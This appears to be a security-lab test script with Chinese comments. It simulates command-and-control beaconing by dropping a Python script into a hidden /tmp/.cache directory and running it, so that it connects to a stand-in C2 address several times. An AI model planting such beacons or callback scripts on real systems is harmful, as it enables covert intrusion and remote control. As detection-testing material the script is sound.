#!/usr/bin/env bash
# attack（窗口内）：回连脚本落盘，解释器周期执行（多次外连）。
set -euo pipefail
C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
cat > /tmp/.cache/beacon/beacon.py <<PY
import socket, time
for _ in range(3):
    try:
        s = socket.create_connection(("$C2_IP", 8443), timeout=3)
        s.sendall(b"beacon")
        time.sleep(1.5)
        s.close()
    except OSError:
        pass
    time.sleep(1)
PY
python3 /tmp/.cache/beacon/beacon.py
